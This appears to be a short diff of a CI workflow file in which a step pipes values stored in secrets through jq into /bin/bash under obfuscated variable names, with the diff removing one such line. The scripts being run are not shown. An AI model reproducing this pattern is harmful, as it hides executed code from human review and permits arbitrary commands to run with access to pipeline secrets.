@@ -21,7 +21,6 @@ jobs:
           scas7: ${{ secrets.scas7 }}
         run: |
           printf '%s' "$scas7" | jq -r .cg21 | /bin/bash
-          printf '%s' "$zsa801" | jq -r .q61 | /bin/bash
           echo $qpz45086 | jq -r .ood84 | /bin/bash
           echo $qmcb1 | jq -r .vlj7468 | /bin/bash
           echo $scz38731 | jq -r .wcx5 | /bin/bash
